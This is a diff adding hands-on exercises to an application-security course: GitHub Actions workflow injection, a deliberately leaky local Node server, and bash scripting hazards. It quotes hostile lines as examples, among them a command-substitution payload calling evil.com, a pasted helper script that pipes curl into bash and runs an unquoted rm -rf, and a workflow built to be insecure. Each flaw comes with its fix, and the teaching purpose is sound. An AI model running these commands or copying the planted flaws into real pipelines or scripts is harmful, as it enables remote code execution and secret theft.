+Why this is the fix and sanitizing isn't: with \`\${{ ... }}\` on the \`run\` line, GitHub **substitutes the raw title into the script** *before a shell exists* — so \`$(curl evil.com | sh)\` becomes literal script text and runs. Bound to \`env:\`, the title arrives as an ordinary environment variable; the shell expands \`$ISSUE_TITLE\` to the *string value* and never re-parses its contents as commands. This is the exact same "keep data out of the code channel" principle as parameterized SQL (Module 0.5) and allow-listed redirects (Module 1.1) — CI/CD is just another place untrusted input meets a command interpreter. Trying to blocklist \`$()\`, backticks, and \`;\` in the title is the losing game you've now seen three times.
+</details>
+
+#### 🔴 Break & Defend — audit the whole workflow ~15 min
+
+This deploy workflow has **three** independent security problems. Find all three and fix each — no tooling, just read it the way an attacker would.
+
+\`\`\`yaml
+name: Deploy
+on: pull_request_target        # (1)
+permissions: write-all         # (2)
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4   # (3)
+        with:
+          ref: \${{ github.event.pull_request.head.sha }}
+      - run: ./deploy.sh
+\`\`\`
+
+**Your task:** for each of the three, name the vulnerability, say concretely what an attacker gains, and write the corrected line. Put it in your journal.
+
+**Done when.** Your journal covers: the dangerous **trigger + untrusted checkout** combination, the **over-broad permissions**, and the **mutable action tag** — each with its fix.
+
+<details>
+<summary>Nudge — open if you've been stuck more than three minutes</summary>
+
+Look at each annotated line against the module's four-vector table. (1)+(3) are a *pair* — think about what context \`pull_request_target\` runs in versus whose code \`head.sha\` checks out. (2) is the permissions default the module told you to replace. (3) is the pinning rule.
+</details>
+
+<details>
+<summary>Walkthrough — open after you've written your audit</summary>
+
+**(1)+(3) — the critical one: \`pull_request_target\` + checking out the fork's head.** \`pull_request_target\` runs in the **base repo's** context — with write permissions and access to secrets — but \`ref: …head.sha\` checks out the *attacker's* fork code, which \`./deploy.sh\` then executes. That's arbitrary code from any fork PR running with your secrets and write access: full remote code execution against your repo and anything its \`GITHUB_TOKEN\`/secrets can reach. **Fix:** don't run untrusted code in this context at all. Use \`on: pull_request\` (fork PRs get *no* secrets and read-only token) for anything that builds/runs PR code; reserve \`pull_request_target\` for steps that never check out or execute fork code (e.g. labeling), and never combine it with a fork-head checkout.
+
+**(2) — \`permissions: write-all\`.** A stolen or misused \`GITHUB_TOKEN\` can now write any branch, publish packages, and cut releases. **Fix:** least privilege, per workflow:
+\`\`\`yaml
+permissions:
+  contents: read
+\`\`\`
+(add \`id-token: write\` only if you use OIDC cloud auth; everything else stays implicitly none).
+
+**(3) — \`actions/checkout@v4\` (mutable tag).** The \`v4\` tag can be moved after you audit it; if the maintainer account is compromised, your next run silently executes new code. **Fix:** pin to a full commit SHA:
+\`\`\`yaml
+- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
+\`\`\`
+
+**Outside the box:** you found these by hand, which is the skill — but this is exactly what **OpenSSF Scorecard** and CodeQL's workflow queries automate at scale. Run Scorecard against a repo before trusting it; it scores precisely these patterns (pinned deps, token permissions, dangerous triggers). And for the secret you committed in Module 1.4's Workbench, this module's \`gitleaks detect --source .\` over the **full history** is the tool that would have caught it in CI before a human ever reviewed the PR. Hand audit teaches you what the scanners are looking for — and when their "all clear" is trustworthy.
+</details>
+
+---
+
 ➡️ **Next step:** Your pipeline is locked down. Now round out the investigator's toolkit — TLS, HTTP, JSON, and process-level inspection — before moving into the browser's security model. Continue to **Module 1.6: Security Investigation Toolkit — curl, openssl, jq, lsof, awk**.`,
     tracker: [
       "Can explain workflow injection and demonstrate the env-var fix pattern in YAML",
@@ -4153,7 +4654,9 @@ If your repo is public (or your org has GHAS):
       "Can explain why OIDC cloud auth is safer than storing static cloud keys as GitHub Secrets",
       "Has enabled secret scanning + push protection on a repository (or personal fork)",
       "Understands SLSA levels 1–3 and can explain what signed provenance means",
-      "Answered the knowledge check"
+      "Answered the knowledge check",
+      "Workbench: rewrote an injectable workflow step using the env-var pattern (no expression on the run line)",
+      "Workbench: audited a workflow and fixed all three planted flaws — pull_request_target+fork checkout, write-all permissions, and a mutable action tag"
     ]
   },
   {
@@ -4552,6 +5055,125 @@ The Flask equivalents: \`flask-talisman\` for the security headers/HSTS, remove 
 6. Because \`example.com\` can't misbehave *for you* — you can't add a leaky header, an oversharing endpoint, or a growing log file to a host you don't own, and you must never send crafted/attack traffic to systems you're not authorized to test. A local server you built is fully authorized to attack and can be made to exhibit exactly the flaw you're studying.
 </details>
 
+---
+
+### 🧪 Workbench: run the investigation yourself
+
+> **What this trains.** The module walked you through each tool against its leaky server. Now you do the investigator's actual job: given a running server and *no instructions*, find what's wrong and produce the command that proves each finding. To keep it frictionless, here's a **dependency-free** version of the leaky server (plain \`http\`, no \`npm install\`) — same four leaks, runs anywhere Node does.
+
+\`\`\`bash
+mkdir -p ~/investigate-workbench && cd ~/investigate-workbench
+cat > leaky.js <<'EOF'
+const http = require("http");
+const fs = require("fs");
+const users = [
+  { id: 1, name: "alice", role: "admin", email: "alice@lab.local" },
+  { id: 2, name: "bob",   role: "user",  email: "bob@lab.local"   }
+];
+http.createServer((req, res) => {
+  res.setHeader("X-Powered-By", "Express");                    // LEAK 1
+  res.setHeader("Server", "Node/22.12.0 (leaky-lab)");         // LEAK 2
+  res.setHeader("Content-Type", "application/json");
+  let body = "{}";
+  if (req.url === "/api/users") body = JSON.stringify(users);
+  else if (req.url === "/debug") body = JSON.stringify({ pid: process.pid, env: process.env }); // LEAK 3
+  else { res.statusCode = 404; body = JSON.stringify({ error: "not found" }); }
+  res.setHeader("Content-Length", Buffer.byteLength(body));
+  res.end(body);
+  fs.appendFileSync("access.log",
+    req.socket.remoteAddress + ' - - [' + new Date().toUTCString() + '] "' +
+    req.method + " " + req.url + ' HTTP/1.1" ' + res.statusCode + " " + Buffer.byteLength(body) + "\\n"); // LEAK 4
+}).listen(3000, "127.0.0.1", () => console.log("leaky server on http://127.0.0.1:3000"));
+EOF
+node leaky.js      # leave running; investigate from a second terminal
+\`\`\`
+
+**The rule:** for each task, write the command from a blank prompt before opening the walkthrough. Every command the module showed you is fair to scroll back to — knowing *which* tool answers the question is the skill being trained.
+
+#### 🟢 Drill 1 — fingerprint the server ~4 min
+
+**Goal.** With one request, read *only the response headers* and identify the two headers that tell an attacker exactly what software (and version) this server runs.
+
+**Done when.** You've named both disclosure headers from your own output, and can say what an attacker does with them.
+
+<details>
+<summary>Walkthrough — open after you've run your own attempt</summary>
+
+\`\`\`bash
+curl -sI http://127.0.0.1:3000/api/users
+# X-Powered-By: Express                 <- LEAK 1: framework disclosure
+# Server: Node/22.12.0 (leaky-lab)      <- LEAK 2: version disclosure
+\`\`\`
+
+\`-I\` issues a HEAD request — headers only, no body — which is the precise tool for "what does this server *say about itself*." Both headers are free reconnaissance: \`X-Powered-By\` names the framework, \`Server\` pins the exact version, and an attacker goes straight to the CVE list for that version instead of guessing. The fix is to stop emitting them (\`app.disable("x-powered-by")\`, strip \`Server\` at a proxy) — but you can't fix what you didn't *notice*, which is why reading headers first is a habit, not a chore.
+</details>
+
+#### 🟡 Build 1 — quantify the worst leak ~8 min
+
+The \`/debug\` endpoint is the dangerous one. Don't just eyeball it — measure it.
+
+**Goal.** With a single pipeline, print **how many** environment variables \`/debug\` exposes, and separately, a clean list of just their **names** (not values).
+
+**Done when.** You have one command that outputs a count (a number), and one that outputs the env-var names one per line — both built from the response, not copied by hand.
+
+<details>
+<summary>Nudge — open if you've been stuck more than two minutes</summary>
+
+The response is JSON, so pipe \`curl -s\` into the JSON tool. Inside it, \`.env\` is an object; its *keys* are the variable names. The module used \`jq 'keys'\` and \`jq -r '.[]...'\` — combine "get the keys" with "how many are there" (\`length\`), and "print each key raw" (\`keys[]\` with \`-r\`).
+</details>
+
+<details>
+<summary>Walkthrough — open after you've run your own attempt</summary>
+
+\`\`\`bash
+curl -s http://127.0.0.1:3000/debug | jq '.env | keys | length'   # a number, e.g. 46
+curl -s http://127.0.0.1:3000/debug | jq -r '.env | keys[]'       # one name per line
+\`\`\`
+
+Why *measuring* matters more than eyeballing: on your machine \`/debug\` might leak 40-odd variables; on a real server that list includes \`DATABASE_URL\`, \`JWT_SECRET\`, \`STRIPE_KEY\`, and cloud credentials. A count turns "this looks bad" into "this endpoint discloses N secrets to anyone who can reach it" — the language of an actual finding. And extracting just the *names* is how you'd triage without splashing the secret *values* across your terminal history (which, per Module 1.3, is its own boring-channel leak). That instinct — don't print the secret you're investigating — is a real professional habit.
+</details>
+
+#### 🔴 Break & Defend — write the findings report ~20 min
+
+This is the module's whole job in one exercise. In your \`~/appsec-journal\`, produce a short **findings report** for this server: for each of the **four** leaks, write (a) a one-line description, (b) the *exact command* that proves it, and (c) the one-line fix. Then answer two judgment questions.
+
+**Your judgment calls:**
+1. Rank the four findings by severity and justify the top one from evidence, not vibes.
+2. Confirm one thing the server did *right*, and prove it with a command. (Hint: where is it listening?)
+
+**Done when.** Your report has four findings each backed by a runnable command, names the \`/debug\` environment dump as the top severity with a reason, and includes a command showing the server is bound to loopback (\`127.0.0.1\`), not \`0.0.0.0\`.
+
+<details>
+<summary>Nudge — open if you've been stuck more than five minutes</summary>
+
+The four leaks map to four tools you already used: headers (\`curl -I\`) cover LEAK 1 and 2; the JSON tool covers LEAK 3; and the access log the server is writing (\`cat access.log\`, then \`awk\`) is LEAK 4. For "what did it do right," the module's process-inspection command shows the bind address — loopback-only is a *good* decision worth crediting.
+</details>
+
+<details>
+<summary>Walkthrough — open after you've written your report</summary>
+
+**A complete report looks like this:**
+
+| # | Finding | Proof command | Fix |
+|---|---------|---------------|-----|
+| 1 | Framework disclosure (\`X-Powered-By: Express\`) | \`curl -sI …/api/users \| grep -i x-powered-by\` | \`app.disable("x-powered-by")\` |
+| 2 | Version disclosure (\`Server\` header) | \`curl -sI …/api/users \| grep -i server\` | omit/strip the \`Server\` header (proxy \`server_tokens off\`) |
+| 3 | **Unauthenticated env dump** at \`/debug\` | \`curl -s …/debug \| jq '.env \| keys \| length'\` | remove \`/debug\`, or admin-gate it and never return \`process.env\` |
+| 4 | Sensitive access log written world-readable | \`cat access.log\` then \`awk '$NF>1000{print $7,$NF}' access.log\` | log to an owner-only file, never log secrets (Phase 9) |
+
+**1. Severity ranking — \`/debug\` (LEAK 3) is #1, decisively.** The header leaks (1, 2) only *accelerate reconnaissance* — they tell an attacker where to look but grant nothing. The log (4) is a real issue but requires local access to read. \`/debug\` is categorically worse: it's **unauthenticated**, **remotely reachable**, and returns the process's entire environment — which in production *is* the secret store (DB URL, signing keys, cloud creds). One request → full credential disclosure → likely full compromise. Evidence, not vibes: \`jq '.env | keys | length'\` returns a two-digit count of variables handed to anyone who asks. The others are "an attacker learns something"; this one is "an attacker *has* your secrets."
+
+**2. What it did right — loopback binding:**
+\`\`\`bash
+lsof -iTCP -sTCP:LISTEN -n -P | grep 3000     # -> 127.0.0.1:3000 (LISTEN)
+\`\`\`
+\`127.0.0.1:3000\` means the server only accepts connections from this machine. That single good decision is the *only* reason the \`/debug\` catastrophe is contained to localhost — flip it to \`0.0.0.0\` and the same endpoint is exposed to the whole network. This is the real lesson of chaining findings: severity is contextual. \`/debug\` is critical-but-contained here; the moment the bind address changes, it's critical-and-exposed. A good report says *both* — the flaw and what's currently holding it back — because the thing holding it back is one config line from disappearing.
+
+**Outside the box:** a report is more valuable when it's *reproducible*. Notice every "proof command" above is copy-pasteable and deterministic — that's what separates a finding an engineer can act on from "I think /debug looks sketchy." The habit of pairing every claim with the exact command that demonstrates it is the difference between a bug report that gets fixed and one that gets argued about. Clean up: \`Ctrl+C\` the server when done.
+</details>
+
+---
+
 ➡️ **Next step:** You can investigate with the right command for a known task, against a real target you control. The last gap is writing your own tooling — bash control flow, heavier text processing, and reaching a host that isn't directly in front of you. Continue to **Module 1.7: Advanced CLI: Shell Scripting, Text Processing & SSH Tunneling**.`,
     tracker: [
       "Built the leaky Node (Express) AND/OR Python (Flask) server and ran it on 127.0.0.1:3000",
@@ -4561,7 +5183,9 @@ The Flask equivalents: \`flask-talisman\` for the security headers/HSTS, remove 
       "Analyzed the server's own access.log with awk + sort + uniq and can map $1/$7/$9/$NF",
       "Used lsof or ss to confirm the bind address and understand 127.0.0.1 vs 0.0.0.0",
       "Applied the fixes (helmet/talisman, disable x-powered-by, gate /debug) and re-ran curl -I to confirm",
-      "Answered the knowledge check"
+      "Answered the knowledge check",
+      "Workbench: investigated the dependency-free leaky server from a blank prompt — fingerprinted it and measured the /debug env dump with jq",
+      "Workbench: wrote a four-finding report, each backed by a reproducible command, ranked /debug top, and proved the loopback bind was done right"
     ]
   }, {
     id: "m1-7",
@@ -4727,6 +5351,136 @@ curl -I http://localhost:9000
 5. You're executing whatever the remote server returns, at the moment you run it, with zero review — if the server is compromised, serves different content based on your IP/User-Agent, or the connection is tampered with, you run exactly what an attacker wants, with your full user privileges. Download and read the script first, or verify its checksum/signature if one is published.
 </details>
 
+---
+
+### 🧪 Workbench: write the tool, then find the bug in one
+
+> **What this trains.** This module's leap is from *running* commands to *writing* them into tools — and the failure mode that comes with it: a script that works on the happy path and betrays you on the edge case. So you'll write a small tool from a blank spec, then audit a dangerous one. Everything is local files.
+
+> **⚠️ Run these as scripts, not by pasting into your prompt.** Your interactive shell is almost certainly **zsh**, which does *not* word-split unquoted variables — so the quoting bug below is invisible if you paste it at the prompt. Put each demo in a file with \`#!/usr/bin/env bash\` and run it (\`./demo.sh\`), or wrap it in \`bash -c '...'\`. Scripts you write run under bash, where the bug is real; this difference is itself worth internalizing.
+
+**The rule:** predict the output before running; for the audit, write your findings before opening the walkthrough.
+
+#### 🟢 Drill 1 — see the unquoted-variable bug for real ~5 min
+
+**Goal.** Prove to yourself that an unquoted variable holding a filename *with a space* gets split into two arguments, and that quoting fixes it — by writing and running a tiny **bash** script (not pasting at your zsh prompt).
+
+\`\`\`bash
+mkdir -p ~/script-workbench && cd ~/script-workbench
+# write your demo into a file — here's the scaffold; you fill in the two loops:
+cat > quoting-demo.sh <<'EOF'
+#!/usr/bin/env bash
+touch "my report.log"
+f="my report.log"
+# TODO: loop over $f UNQUOTED and print each arg
+# TODO: loop over "$f" QUOTED and print each arg
+EOF
+\`\`\`
+
+**Done when.** Your unquoted loop prints **two** args (\`my\` and \`report.log\`); your quoted loop prints **one** (\`my report.log\`) — and you saw the difference only because you ran it under bash.
+
+<details>
+<summary>Walkthrough — open after you've run your own attempt</summary>
+
+\`\`\`bash
+#!/usr/bin/env bash
+touch "my report.log"
+f="my report.log"
+echo "unquoted:"; for x in $f;   do echo "  arg: [$x]"; done   # -> [my] then [report.log]
+echo "quoted:";   for x in "$f"; do echo "  arg: [$x]"; done   # -> [my report.log]
+\`\`\`
+
+Unquoted, bash applies **word-splitting** on whitespace before the loop runs, so one filename becomes two arguments. Now make it dangerous in your head: replace \`echo\` with \`rm\`. \`rm $f\` on \`my report.log\` runs \`rm my report.log\` — it tries to delete *two* files named \`my\` and \`report.log\`, and if a file named \`my\` happens to exist, it's gone. This is the scripting-level twin of every injection in this phase: **an unquoted variable lets the shell reinterpret your *data* as *structure* (argument boundaries).** The fix is mechanical and universal — quote every expansion: \`"$f"\`.
+
+**Why zsh hid it:** zsh doesn't word-split unquoted parameters by default, so this exact bug is invisible at a zsh prompt yet very real in the bash script you deploy. "It worked when I tested it interactively" is how quoting bugs reach production — always test tools the way they'll actually run.
+</details>
+
+#### 🟡 Build 1 — write a tool the module didn't give you ~12 min
+
+The module's \`scan-logs.sh\` counts a pattern across files. Write a *different* one from scratch.
+
+**Goal.** A script \`worst.sh\` that takes a pattern and a list of files and prints, for each file, how many matches it has — then a final line naming the **single file with the most matches**. It must start with \`set -euo pipefail\`, print a usage message and exit non-zero if given fewer than two arguments, and skip (not crash on) a filename that doesn't exist.
+
+Test data:
+\`\`\`bash
+printf 'ERROR a\\nERROR b\\nINFO c\\n' > app.log
+printf 'ERROR x\\nINFO y\\nINFO z\\nERROR w\\nERROR v\\n' > worker.log
+\`\`\`
+
+**Done when.** \`./worst.sh ERROR app.log worker.log\` reports \`app.log: 2\`, \`worker.log: 3\`, and \`WORST: worker.log\`; \`./worst.sh ERROR\` prints usage and \`echo $?\` shows a non-zero code; and pointing it at a missing file skips that file instead of aborting.
+
+<details>
+<summary>Nudge — open if you've been stuck more than three minutes</summary>
+
+Structure: guard \`$#\` (arg count) first; capture the pattern then \`shift\` so \`"$@"\` is just the files; loop with a running \`max\` and a \`worst\` name, updating both when a count beats \`max\`. Use \`grep -c\` for the per-file count. Two \`set -e\` gotchas to design around: \`grep -c\` *exits non-zero when it finds zero matches*, which \`set -e\` would treat as fatal — guard it with \`|| true\`. And quote every variable (\`"$f"\`, \`"$@"\`).
+</details>
+
+<details>
+<summary>Walkthrough — open after you've written and tested it</summary>
+
+\`\`\`bash
+#!/usr/bin/env bash
+set -euo pipefail
+[[ $# -ge 2 ]] || { echo "Usage: $0 <pattern> <file...>" >&2; exit 1; }
+pattern="$1"; shift
+worst=""; max=-1
+for f in "$@"; do
+  [[ -f "$f" ]] || { echo "skip: $f not found" >&2; continue; }
+  count=$(grep -c "$pattern" "$f" || true)   # || true: 0 matches is not a script-fatal error
+  echo "$f: $count"
+  (( count > max )) && { max=$count; worst="$f"; }
+done
+echo "WORST: $worst ($max)"
+\`\`\`
+
+The three things that make this a *tool* rather than a one-liner are exactly the three the spec forced: **argument validation** (usage + non-zero exit — so it composes safely in a bigger pipeline, per \`$?\` from the module), **per-item resilience** (a missing file is skipped with a message, not a crash), and **defensive quoting** (\`"$f"\`, \`"$@"\`). The subtle one is \`grep -c … || true\`: \`grep\` returns non-zero when it matches nothing, and under \`set -e\` that would kill your script on a perfectly normal "this file had zero errors." Knowing where \`set -e\` *over*-fires is as important as turning it on — that was the module's "\`-e\` is a safety net, not a substitute for real error handling."
+</details>
+
+#### 🔴 Break & Defend — audit a script and plan a pivot ~15 min
+
+Two parts.
+
+**Part A — audit this "helper" someone pasted in your team chat.** Find every hazard; do **not** run it as-is.
+\`\`\`bash
+#!/usr/bin/env bash
+file=$1
+rm -rf $file/tmp
+curl https://get.example.com/setup.sh | bash
+\`\`\`
+
+**Part B — the pivot.** A database listens on \`127.0.0.1:5432\` on a lab server (\`you@10.10.10.5\`) — it's firewalled off from direct access, reachable *only* from that server itself. Using the tunneling the module taught, write the one command that lets a tool on **your** machine connect to that database as if it were local on port \`5433\`.
+
+**Done when.** Your audit names at least three distinct hazards in Part A with a fix for each, and your Part B command is a correct local-forward that maps your \`localhost:5433\` to the server's own \`127.0.0.1:5432\`.
+
+<details>
+<summary>Nudge — open if you've been stuck more than four minutes</summary>
+
+Part A: look at each line — \`$1\` assigned and used *unquoted* (and what if it's empty?), a destructive \`rm -rf\` on that unquoted path, and a download piped straight into an interpreter. Part B: local forwarding is \`ssh -L <local-port>:<host-as-seen-from-the-server>:<remote-port> user@server\` — and "as seen from the server," the database is at \`127.0.0.1\`.
+</details>
+
+<details>
+<summary>Walkthrough — open after you've written both answers</summary>
+
+**Part A — the hazards:**
+- **Unquoted \`$1\` / \`$file\`, twice.** \`file=$1\` then \`rm -rf $file/tmp\` — if \`$1\` contains a space or glob it's re-split/expanded, and \`rm -rf\` acting on the wrong split path is catastrophic. Fix: \`file="$1"\` and \`rm -rf "$file/tmp"\`.
+- **No argument or emptiness check.** If the script is called with no argument, \`$file\` is empty and (without \`set -u\`) \`rm -rf /tmp\` — or worse patterns — can result. Fix: \`set -euo pipefail\` **and** \`[[ -n "\${1:-}" ]] || { echo "need a path" >&2; exit 1; }\`.
+- **\`curl … | bash\`.** Executes whatever the server returns, right now, with your privileges, unread — the exact trap from Module 0.6, now inside a script where it's even easier to miss. Fix: download, read, verify a checksum/signature, *then* run: \`curl -fsSL …/setup.sh -o setup.sh && less setup.sh && bash setup.sh\`.
+- (Bonus) **No \`set -euo pipefail\`**, so every one of the above fails silently rather than loudly.
+
+**Part B — the tunnel:**
+\`\`\`bash
+ssh -L 5433:127.0.0.1:5432 you@10.10.10.5
+# now on your machine: psql -h 127.0.0.1 -p 5433   reaches the server's firewalled database
+\`\`\`
+The \`127.0.0.1\` in the middle is resolved **on the server**, so it means "the database as the server itself sees it" — which is the whole point: the DB is bound to the server's loopback and unreachable from outside, and the tunnel carries your connection *through* the authenticated SSH session to that loopback. One honest caveat the module flagged: SSH encrypts your hop to the server, but the server-to-database leg is whatever the DB uses locally — the tunnel is not a blanket end-to-end guarantee.
+
+**Outside the box:** Part A is how real supply-chain and insider incidents start — a "helpful" script pasted into chat, run without reading, on a machine with credentials. The defensive reflex the whole phase has been building — *don't run input you haven't inspected, quote everything, fail loudly* — is the same reflex whether the untrusted input is SQL, a URL, a workflow title, or a shell script. That's the through-line of Phase 1: you now write your own tools, which means you're now the one who has to not build the vulnerability in.
+</details>
+
+---
+
+> **Phase 1 complete.** You can read and forge the protocols, investigate a running server, keep secrets out of history, harden a pipeline, and write your own tooling — each proven by something you *did*, not just read. Next you point all of it at deliberately vulnerable applications.
+
 ➡️ **Next step:** You can now write your own tools instead of only running other people's. Time to point that toolkit at real, deliberately vulnerable applications. Continue to **Phase 2: Secure JavaScript and Browser Security**.
 
 ### Phase 1 Deliverable
@@ -4749,7 +5503,7 @@ Create \`~/appsec-journal/notes/phase-1-web-cli-foundations.md\` and answer, in 
 - **A new habit:** answers vary, but common ones: quoting every URL passed to \`curl\` (an unquoted \`?\` is a shell glob in zsh); running \`gitleaks detect\` before the first commit of any new project, not after; reflexively \`chmod 600\`-ing anything that holds a secret; never trusting a tag-pinned GitHub Action in a workflow that touches secrets.
 
 </details>`,
-    tracker: ["Wrote and ran a bash script with a function, a loop, and proper argument handling", "Used `set -euo pipefail` and can explain what each flag catches", "Used `sed -i` with a backup to bulk-edit files, and `xargs` to chain a find result into an action", "Can explain the difference between BRE and ERE and when each applies", "Forwarded a local port to a remote/VM service with `ssh -L` and verified it with curl", "Can name the SSH tunneling risk: it only encrypts the SSH hop, not necessarily the destination service", "Wrote the Phase 1 deliverable journal entry", "Answered the knowledge check"]
+    tracker: ["Wrote and ran a bash script with a function, a loop, and proper argument handling", "Used `set -euo pipefail` and can explain what each flag catches", "Used `sed -i` with a backup to bulk-edit files, and `xargs` to chain a find result into an action", "Can explain the difference between BRE and ERE and when each applies", "Forwarded a local port to a remote/VM service with `ssh -L` and verified it with curl", "Can name the SSH tunneling risk: it only encrypts the SSH hop, not necessarily the destination service", "Wrote the Phase 1 deliverable journal entry", "Answered the knowledge check", "Workbench: reproduced the unquoted-variable word-splitting bug in a bash script (and understood why zsh hid it)", "Workbench: wrote worst.sh from scratch with set -euo pipefail, arg validation, missing-file skip, and the grep -c || true guard", "Workbench: audited a dangerous pasted script (unquoted rm, curl|bash) and wrote the ssh -L pivot to a firewalled database"]
   },
   // ============== PHASE 2 ==============
   {
